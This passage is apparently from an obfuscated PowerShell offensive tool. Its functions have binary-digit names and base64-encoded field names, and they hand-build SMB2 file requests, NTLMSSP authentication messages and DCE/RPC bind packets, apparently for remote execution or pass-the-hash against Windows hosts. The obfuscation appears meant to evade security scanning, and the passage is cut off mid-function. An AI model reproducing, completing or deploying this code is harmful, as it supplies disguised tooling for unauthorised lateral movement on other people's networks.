    ${00100000000000110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGEAbABlAGMAdAAyAA=='))),[Byte[]](0x10,0x02))
    return ${00100000000000110}
}
function _00000111000110001
{
    param([Byte[]]${_00001011010101101})
    [Byte[]]${10000011110010101} = ([System.BitConverter]::GetBytes(${_00001011010101101}.Length))[0,1]
    ${10101011000001101} = New-Object System.Collections.Specialized.OrderedDictionary
    ${10101011000001101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x19,0x00))
    ${10101011000001101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))),[Byte[]](0x00))
    ${10101011000001101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AbwBkAGUA'))),[Byte[]](0x01))
    ${10101011000001101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAHAAYQBiAGkAbABpAHQAaQBlAHMA'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10101011000001101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAbgBuAGUAbAA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10101011000001101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AEIAdQBmAGYAZQByAE8AZgBmAHMAZQB0AA=='))),[Byte[]](0x58,0x00))
    ${10101011000001101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AEIAdQBmAGYAZQByAEwAZQBuAGcAdABoAA=='))),${10000011110010101})
    ${10101011000001101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGUAdgBpAG8AdQBzAFMAZQBzAHMAaQBvAG4ASQBEAA=='))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    ${10101011000001101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIA'))),${_00001011010101101})
    return ${10101011000001101} 
}
function _10100100100010100
{
    param([Byte[]]${_00011101111100111})
    [Byte[]]${10000110101011000} = ([System.BitConverter]::GetBytes(${_00011101111100111}.Length))[0,1]
    ${10101111100101010} = New-Object System.Collections.Specialized.OrderedDictionary
    ${10101111100101010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x09,0x00))
    ${10101111100101010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00,0x00))
    ${10101111100101010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaABPAGYAZgBzAGUAdAA='))),[Byte[]](0x48,0x00))
    ${10101111100101010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaABMAGUAbgBnAHQAaAA='))),${10000110101011000})
    ${10101111100101010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIA'))),${_00011101111100111})
    return ${10101111100101010}
}
function _01000010011000111
{
    param([Byte[]]${_10011111010111110})
    ${00010000101101100} = ([System.BitConverter]::GetBytes(${_10011111010111110}.Length))[0,1]
    ${10111011000001000} = New-Object System.Collections.Specialized.OrderedDictionary
    ${10111011000001000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x39,0x00))
    ${10111011000001000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))),[Byte[]](0x00))
    ${10111011000001000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdABlAGQATwBwAGwAbwBjAGsATABlAHYAZQBsAA=='))),[Byte[]](0x00))
    ${10111011000001000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAZQByAHMAbwBuAGEAdABpAG8AbgA='))),[Byte[]](0x02,0x00,0x00,0x00))
    ${10111011000001000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAQwByAGUAYQB0AGUARgBsAGEAZwBzAA=='))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    ${10111011000001000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    ${10111011000001000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAaQByAGUAZABBAGMAYwBlAHMAcwA='))),[Byte[]](0x03,0x00,0x00,0x00))
    ${10111011000001000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBBAHQAdAByAGkAYgB1AHQAZQBzAA=='))),[Byte[]](0x80,0x00,0x00,0x00))
    ${10111011000001000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGEAcgBlAEEAYwBjAGUAcwBzAA=='))),[Byte[]](0x01,0x00,0x00,0x00))
    ${10111011000001000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUARABpAHMAcABvAHMAaQB0AGkAbwBuAA=='))),[Byte[]](0x01,0x00,0x00,0x00))
    ${10111011000001000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUATwBwAHQAaQBvAG4AcwA='))),[Byte[]](0x40,0x00,0x00,0x00))
    ${10111011000001000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQBPAGYAZgBzAGUAdAA='))),[Byte[]](0x78,0x00))
    ${10111011000001000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQBMAGUAbgBnAHQAaAA='))),${00010000101101100})
    ${10111011000001000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAQwBvAG4AdABlAHgAdABzAE8AZgBmAHMAZQB0AA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10111011000001000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAQwBvAG4AdABlAHgAdABzAEwAZQBuAGcAdABoAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10111011000001000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIA'))),${_10011111010111110})
    return ${10111011000001000}
}
function _10100010011010000
{
    param ([Byte[]]${_10100010101001100})
    ${10010100101011110} = New-Object System.Collections.Specialized.OrderedDictionary
    ${10010100101011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x31,0x00))
    ${10010100101011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAGQAZABpAG4AZwA='))),[Byte[]](0x50))
    ${10010100101011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))),[Byte[]](0x00))
    ${10010100101011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABlAG4AZwB0AGgA'))),[Byte[]](0x00,0x00,0x10,0x00))
    ${10010100101011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBmAGYAcwBlAHQA'))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    ${10010100101011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBJAEQA'))),${_10100010101001100})
    ${10010100101011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AaQBtAHUAbQBDAG8AdQBuAHQA'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10010100101011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAbgBuAGUAbAA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10010100101011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AYQBpAG4AaQBuAGcAQgB5AHQAZQBzAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10010100101011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABDAGgAYQBuAG4AZQBsAEkAbgBmAG8ATwBmAGYAcwBlAHQA'))),[Byte[]](0x00,0x00))
    ${10010100101011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABDAGgAYQBuAG4AZQBsAEkAbgBmAG8ATABlAG4AZwB0AGgA'))),[Byte[]](0x00,0x00))
    ${10010100101011110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIA'))),[Byte[]](0x30))
    return ${10010100101011110}
}
function _01001001100010110
{
    param([Byte[]]${_10100010101001100},[Int]${_10001101100000100})
    [Byte[]]${10111011011110110} = [System.BitConverter]::GetBytes(${_10001101100000100})
    ${01101000100001010} = New-Object System.Collections.Specialized.OrderedDictionary
    ${01101000100001010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x31,0x00))
    ${01101000100001010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBPAGYAZgBzAGUAdAA='))),[Byte[]](0x70,0x00))
    ${01101000100001010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABlAG4AZwB0AGgA'))),${10111011011110110})
    ${01101000100001010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBmAGYAcwBlAHQA'))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    ${01101000100001010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBJAEQA'))),${_10100010101001100})
    ${01101000100001010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAbgBuAGUAbAA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${01101000100001010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AYQBpAG4AaQBuAGcAQgB5AHQAZQBzAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${01101000100001010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAEMAaABhAG4AbgBlAGwASQBuAGYAbwBPAGYAZgBzAGUAdAA='))),[Byte[]](0x00,0x00))
    ${01101000100001010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAEMAaABhAG4AbgBlAGwASQBuAGYAbwBMAGUAbgBnAHQAaAA='))),[Byte[]](0x00,0x00))
    ${01101000100001010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    return ${01101000100001010}
}
function _00000000010100111
{
    param ([Byte[]]${_10100010101001100})
    ${00101100010001110} = New-Object System.Collections.Specialized.OrderedDictionary
    ${00101100010001110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x18,0x00))
    ${00101100010001110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))),[Byte[]](0x00,0x00))
    ${00101100010001110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${00101100010001110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBJAEQA'))),${_10100010101001100})
    return ${00101100010001110}
}
function _10111001110100010
{
    ${01110011111011010} = New-Object System.Collections.Specialized.OrderedDictionary
    ${01110011111011010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x04,0x00))
    ${01110011111011010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00,0x00))
    return ${01110011111011010}
}
function _10011010100100010
{
    ${01101100000101011} = New-Object System.Collections.Specialized.OrderedDictionary
    ${01101100000101011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x04,0x00))
    ${01101100000101011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00,0x00))
    return ${01101100000101011}
}
function _00010111111111111
{
    param([Byte[]]${_10110110010111111},[Byte[]]$Version)
    [Byte[]]${01000110110001010} = ([System.BitConverter]::GetBytes($Version.Length + 32))[0]
    [Byte[]]${10111111001100111} = ${01000110110001010}[0] + 32
    [Byte[]]${10111001111001001} = ${01000110110001010}[0] + 22
    [Byte[]]${01011001111111101} = ${01000110110001010}[0] + 20
    [Byte[]]${01111001001011110} = ${01000110110001010}[0] + 2
    ${00010100001110001} = New-Object System.Collections.Specialized.OrderedDictionary
    ${00010100001110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGkAdABpAGEAbABDAG8AbgB0AGUAeAB0AFQAbwBrAGUAbgBJAEQA'))),[Byte[]](0x60))
    ${00010100001110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGkAdABpAGEAbABjAG8AbgB0AGUAeAB0AFQAbwBrAGUAbgBMAGUAbgBnAHQAaAA='))),${10111111001100111})
    ${00010100001110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGkAcwBNAGUAYwBoAEkARAA='))),[Byte[]](0x06))
    ${00010100001110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGkAcwBNAGUAYwBoAEwAZQBuAGcAdABoAA=='))),[Byte[]](0x06))
    ${00010100001110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBJAEQA'))),[Byte[]](0x2b,0x06,0x01,0x05,0x05,0x02))
    ${00010100001110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAG4AZQByAEMAbwBuAHQAZQB4AHQAVABvAGsAZQBuAEkARAA='))),[Byte[]](0xa0))
    ${00010100001110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAG4AZQByAEMAbwBuAHQAZQB4AHQAVABvAGsAZQBuAEwAZQBuAGcAdABoAA=='))),${10111001111001001})
    ${00010100001110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAG4AZQByAEMAbwBuAHQAZQB4AHQAVABvAGsAZQBuAEkARAAyAA=='))),[Byte[]](0x30))
    ${00010100001110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAG4AZQByAEMAbwBuAHQAZQB4AHQAVABvAGsAZQBuAEwAZQBuAGcAdABoADIA'))),${01011001111111101})
    ${00010100001110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGMAaABUAHkAcABlAHMASQBEAA=='))),[Byte[]](0xa0))
    ${00010100001110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGMAaABUAHkAcABlAHMATABlAG4AZwB0AGgA'))),[Byte[]](0x0e))
    ${00010100001110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGMAaABUAHkAcABlAHMASQBEADIA'))),[Byte[]](0x30))
    ${00010100001110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGMAaABUAHkAcABlAHMATABlAG4AZwB0AGgAMgA='))),[Byte[]](0x0c))
    ${00010100001110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGMAaABUAHkAcABlAHMASQBEADMA'))),[Byte[]](0x06))
    ${00010100001110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGMAaABUAHkAcABlAHMATABlAG4AZwB0AGgAMwA='))),[Byte[]](0x0a))
    ${00010100001110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGMAaABUAHkAcABlAA=='))),[Byte[]](0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a))
    ${00010100001110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGMAaABUAG8AawBlAG4ASQBEAA=='))),[Byte[]](0xa2))
    ${00010100001110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGMAaABUAG8AawBlAG4ATABlAG4AZwB0AGgA'))),${01111001001011110})
    ${00010100001110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQBTAFMAUABJAEQA'))),[Byte[]](0x04))
    ${00010100001110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQBTAFMAUABMAGUAbgBnAHQAaAA='))),${01000110110001010})
    ${00010100001110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAZgBpAGUAcgA='))),[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
    ${00010100001110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAHMAcwBhAGcAZQBUAHkAcABlAA=='))),[Byte[]](0x01,0x00,0x00,0x00))
    ${00010100001110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAGcAbwB0AGkAYQB0AGUARgBsAGEAZwBzAA=='))),${_10110110010111111})
    ${00010100001110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwBXAG8AcgBrAHMAdABhAHQAaQBvAG4ARABvAG0AYQBpAG4A'))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    ${00010100001110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwBXAG8AcgBrAHMAdABhAHQAaQBvAG4ATgBhAG0AZQA='))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    if($Version)
    {
        ${00010100001110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))),$Version)
    }
    return ${00010100001110001}
}
function _10011110011101011
{
    param([Byte[]]${_00011011111100100})
    [Byte[]]${01000110110001010} = ([System.BitConverter]::GetBytes(${_00011011111100100}.Length))[1,0]
    [Byte[]]${10111111001100111} = ([System.BitConverter]::GetBytes(${_00011011111100100}.Length + 12))[1,0]
    [Byte[]]${10111001111001001} = ([System.BitConverter]::GetBytes(${_00011011111100100}.Length + 8))[1,0]
    [Byte[]]${01011001111111101} = ([System.BitConverter]::GetBytes(${_00011011111100100}.Length + 4))[1,0]
    ${00010010111100000} = New-Object System.Collections.Specialized.OrderedDictionary
    ${00010010111100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBTAE4ASQBEAA=='))),[Byte[]](0xa1,0x82))
    ${00010010111100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBTAE4ATABlAG4AZwB0AGgA'))),${10111111001100111})
    ${00010010111100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBTAE4ASQBEADIA'))),[Byte[]](0x30,0x82))
    ${00010010111100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBTAE4ATABlAG4AZwB0AGgAMgA='))),${10111001111001001})
    ${00010010111100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBTAE4ASQBEADMA'))),[Byte[]](0xa2,0x82))
    ${00010010111100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBTAE4ATABlAG4AZwB0AGgAMwA='))),${01011001111111101})
    ${00010010111100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQBTAFMAUABJAEQA'))),[Byte[]](0x04,0x82))
    ${00010010111100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQBTAFMAUABMAGUAbgBnAHQAaAA='))),${01000110110001010})
    ${00010010111100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQBSAGUAcwBwAG8AbgBzAGUA'))),${_00011011111100100})
    return ${00010010111100000}
}
function _10000010011110100
{
    param([Byte[]]${_10100001110001000},[Int]${_01001000100000000},[Byte[]]${_00100110100111001},[Byte[]]${_10110100111010000},[Byte[]]${_01011010101010011},[Byte[]]${_10000110100100010})
    [Byte[]]${10110011110100111} = [System.BitConverter]::GetBytes(${_01001000100000000})
    ${10000111001100000} = New-Object System.Collections.Specialized.OrderedDictionary
    ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))),[Byte[]](0x05))
    ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgBNAGkAbgBvAHIA'))),[Byte[]](0x00))
    ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAGMAawBlAHQAVAB5AHAAZQA='))),[Byte[]](0x0b))
    ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAGMAawBlAHQARgBsAGEAZwBzAA=='))),[Byte[]](0x03))
    ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBSAGUAcAByAGUAcwBlAG4AdABhAHQAaQBvAG4A'))),[Byte[]](0x10,0x00,0x00,0x00))
    ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgByAGEAZwBMAGUAbgBnAHQAaAA='))),${_10100001110001000})
    ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABMAGUAbgBnAHQAaAA='))),[Byte[]](0x00,0x00))
    ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABJAEQA'))),${10110011110100111})
    ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAWABtAGkAdABGAHIAYQBnAA=='))),[Byte[]](0xb8,0x10))
    ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAUgBlAGMAdgBGAHIAYQBnAA=='))),[Byte[]](0xb8,0x10))
    ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBzAHMAbwBjAEcAcgBvAHUAcAA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AQwB0AHgASQB0AGUAbQBzAA=='))),${_00100110100111001})
    ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgA='))),[Byte[]](0x00,0x00,0x00))
    ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdABJAEQA'))),${_10110100111010000})
    ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AVAByAGEAbgBzAEkAdABlAG0AcwA='))),[Byte[]](0x01))
    ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgAyAA=='))),[Byte[]](0x00))
    ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUA'))),${_01011010101010011})
    ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAVgBlAHIA'))),${_10000110100100010})
    ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAVgBlAHIATQBpAG4AbwByAA=='))),[Byte[]](0x00,0x00))
    ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGEAbgBzAGYAZQByAFMAeQBuAHQAYQB4AA=='))),[Byte[]](0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60))
    ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGEAbgBzAGYAZQByAFMAeQBuAHQAYQB4AFYAZQByAA=='))),[Byte[]](0x02,0x00,0x00,0x00))
    if(${_00100110100111001}[0] -eq 2)
    {
        ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdABJAEQAMgA='))),[Byte[]](0x01,0x00))
        ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AVAByAGEAbgBzAEkAdABlAG0AcwAyAA=='))),[Byte[]](0x01))
        ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgAzAA=='))),[Byte[]](0x00))
        ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAMgA='))),${_01011010101010011})
        ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAVgBlAHIAMgA='))),${_10000110100100010})
        ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAVgBlAHIATQBpAG4AbwByADIA'))),[Byte[]](0x00,0x00))
        ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGEAbgBzAGYAZQByAFMAeQBuAHQAYQB4ADIA'))),[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGEAbgBzAGYAZQByAFMAeQBuAHQAYQB4AFYAZQByADIA'))),[Byte[]](0x01,0x00,0x00,0x00))
    }
    elseif(${_00100110100111001}[0] -eq 3)
    {
        ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdABJAEQAMgA='))),[Byte[]](0x01,0x00))
        ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AVAByAGEAbgBzAEkAdABlAG0AcwAyAA=='))),[Byte[]](0x01))
        ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgAzAA=='))),[Byte[]](0x00))
        ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAMgA='))),${_01011010101010011})
        ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAVgBlAHIAMgA='))),${_10000110100100010})
        ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAVgBlAHIATQBpAG4AbwByADIA'))),[Byte[]](0x00,0x00))
        ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGEAbgBzAGYAZQByAFMAeQBuAHQAYQB4ADIA'))),[Byte[]](0x33,0x05,0x71,0x71,0xba,0xbe,0x37,0x49,0x83,0x19,0xb5,0xdb,0xef,0x9c,0xcc,0x36))
        ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGEAbgBzAGYAZQByAFMAeQBuAHQAYQB4AFYAZQByADIA'))),[Byte[]](0x01,0x00,0x00,0x00))
        ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdABJAEQAMwA='))),[Byte[]](0x02,0x00))
        ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AVAByAGEAbgBzAEkAdABlAG0AcwAzAA=='))),[Byte[]](0x01))
        ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgA0AA=='))),[Byte[]](0x00))
        ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAMwA='))),${_01011010101010011})
